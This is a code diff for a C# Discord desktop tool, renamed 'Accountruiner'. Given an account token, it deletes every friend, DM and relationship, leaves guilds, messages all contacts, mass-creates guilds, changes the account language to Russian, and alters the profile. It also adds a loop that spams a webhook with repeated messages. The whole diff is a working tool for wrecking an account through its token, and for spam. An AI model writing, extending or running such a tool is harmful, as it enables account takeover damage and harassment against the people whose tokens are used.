@@ -1,21 +1,24 @@
 ﻿using System;
 using System.Drawing;
 using System.Windows.Forms;
-using System.Runtime.InteropServices;
+using System.Collections.Specialized;
 using Discord;
 using Discord.Gateway;
+using System.Net;
+using System.Deployment.Application;
 
-namespace MultiTool
+namespace Accountruiner
 {
     public partial class Form1 : MetroFramework.Forms.MetroForm
     {
+        #region form stuff
         [Obsolete]
         public Form1()
         {
             InitializeComponent();
             this.StyleManager = metroStyleManager1;
         }
-
+        
         //epic close button
         private void label1_Click(object sender, EventArgs e)
         {
@@ -44,11 +47,11 @@ namespace MultiTool
                 this.WndProc(ref msg);
             }
         }
-        
-        //anarchy
-        
-        //remove friends
-        private void metroButton10_Click(object sender, EventArgs e)
+
+        #endregion
+
+        #region remove friends
+        private void metroButton2_Click(object sender, EventArgs e)
         {
             if (!checkiftoken())
             {
@@ -59,35 +62,37 @@ namespace MultiTool
             DiscordClient client = new DiscordClient(token);
 
             foreach (var relationship in client.GetRelationships())
-            {                
-                        
+            {
+
                 if (relationship.Type == RelationshipType.Friends)
-                relationship.Remove();
-                        
+                    relationship.Remove();
+
                 if (relationship.Type == RelationshipType.IncomingRequest)
-                relationship.Remove();
+                    relationship.Remove();
 
                 if (relationship.Type == RelationshipType.OutgoingRequest)
-                relationship.Remove();
+                    relationship.Remove();
 
                 if (relationship.Type == RelationshipType.Blocked)
-                relationship.Remove();
+                    relationship.Remove();
             }
-            
-        }
 
-        //leave guilds
+        }
+        #endregion
+
+        #region remove guilds
+
         private void metroButton9_Click(object sender, EventArgs e)
         {
             if (!checkiftoken())
             {
                 return;
             }
-            
+
             string token = (metroTextBox13.Text);
 
             DiscordClient client = new DiscordClient(token);
-            
+
             foreach (var guild in client.GetGuilds())
             {
                 if (guild.Owner)
@@ -100,15 +105,16 @@ namespace MultiTool
 
             }
         }
+        #endregion
 
-        //close dms
+        #region close dms
         private void metroButton13_Click(object sender, EventArgs e)
         {
             if (!checkiftoken())
             {
                 return;
             }
-            
+
             string token = (metroTextBox13.Text);
 
             DiscordClient client = new DiscordClient(token);
@@ -118,15 +124,16 @@ namespace MultiTool
                 dm.Delete();
             }
         }
+        #endregion
 
-        //message everyone
+        #region messageall
         private void metroButton12_Click(object sender, EventArgs e)
         {
             if (!checkiftoken())
             {
                 return;
             }
-            
+
             string token = (metroTextBox13.Text);
 
             DiscordClient client = new DiscordClient(token);
@@ -138,15 +145,16 @@ namespace MultiTool
                     dm.SendMessage(metroTextBox17.Text);
                 }
             }
-            
+
             catch
             {
                 MessageBox.Show("are you sure you have permission to send messages to that user?");
             }
 
         }
-        
-        //guild creator
+        #endregion
+
+        #region massguild
         private void metroTrackBar2_Scroll(object sender, ScrollEventArgs e)
         {
             metroLabel25.Text = metroTrackBar2.Value.ToString();
@@ -173,7 +181,7 @@ namespace MultiTool
             string guildname = metroTextBox14.Text;
 
             int repeat = metroTrackBar2.Value;
-            
+
             string token = (metroTextBox13.Text);
 
             DiscordClient client = new DiscordClient(token);
@@ -196,35 +204,37 @@ namespace MultiTool
                 {
                     client.CreateGuild(guildname, Image.FromFile(avatar), "russia");
                 }
-                
-                catch{}
+
+                catch { }
             }
-            
+
         }
-        
-        //change language to russian
+        #endregion
+
+        #region lang
         private void metroButton18_Click(object sender, EventArgs e)
         {
             if (!checkiftoken())
             {
                 return;
             }
-            
+
             string token = (metroTextBox13.Text);
 
             DiscordClient client = new DiscordClient(token);
 
             client.User.ChangeSettings(new UserSettingsProperties() { Language = DiscordLanguage.Russian });
         }
+        #endregion
 
-        //change status
+        #region status
         private void metroButton16_Click(object sender, EventArgs e)
         {
             if (!checkiftoken())
             {
                 return;
             }
-            
+
             string token = (metroTextBox13.Text);
 
             DiscordClient client = new DiscordClient(token);
@@ -233,9 +243,9 @@ namespace MultiTool
                 CustomStatus = new CustomStatus() { Text = metroTextBox15.Text }
             });
         }
+        #endregion
 
-        //change pfp
-        
+        #region avatar
         private void metroButton15_Click(object sender, EventArgs e)
         {
             OpenFileDialog fileSelect = new OpenFileDialog();
@@ -244,7 +254,7 @@ namespace MultiTool
                 this.profile = fileSelect.FileName;
             }
         }
-        
+
         private string profile = "";
 
         private void metroButton17_Click(object sender, EventArgs e)
@@ -253,25 +263,70 @@ namespace MultiTool
             {
                 return;
             }
-            
+
             string token = (metroTextBox13.Text);
 
             DiscordClient client = new DiscordClient(token);
-            
-            if(profile == "")
+
+            if (profile == "")
             {
                 MessageBox.Show("please select an image");
                 return;
             }
-            
+
             else
             {
                 client.User.ChangeProfile(new UserProfileUpdate() { Avatar = Image.FromFile(profile) });
             }
         }
+        #endregion
 
-        //check if token
-        //shoutout pxseu#0001
+        #region webhook
+        class Http
+        {
+            public static byte[] Post(string uri, NameValueCollection pairs)
+            {
+                using (WebClient webClient = new WebClient())
+                    return webClient.UploadValues(uri, pairs);
+            }
+        }
+        
+        public static void sendWebHook(string URL, string msg, string username)
+        {
+            Http.Post(URL, new NameValueCollection()
+            { 
+                {
+                    "username",
+                    username
+                },
+                {
+                    "content",
+                     msg
+                },
+            });
+        }
+
+        private void metroTrackBar1_Scroll(object sender, ScrollEventArgs e)
+        {
+            metroLabel11.Text = metroTrackBar1.Value.ToString();
+        }
+        
+        private void metroButton1_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                int repeat = metroTrackBar1.Value;
+                for (int i = 0; i < repeat; i++)
+                {
+                    sendWebHook(metroTextBox2.Text, metroTextBox1.Text, metroTextBox3.Text);
+                    System.Threading.Thread.Sleep(1000);
+                }
+            }
+            catch{ }
+        }
+        #endregion
+
+        #region checkiftoken
         private bool checkiftoken()
         {
             if (metroTextBox13.Text == "")
@@ -279,9 +334,9 @@ namespace MultiTool
                 MessageBox.Show("please enter a token");
                 return false;
             }
-
+            
             return true;
         }
-
+        #endregion
     }
 }
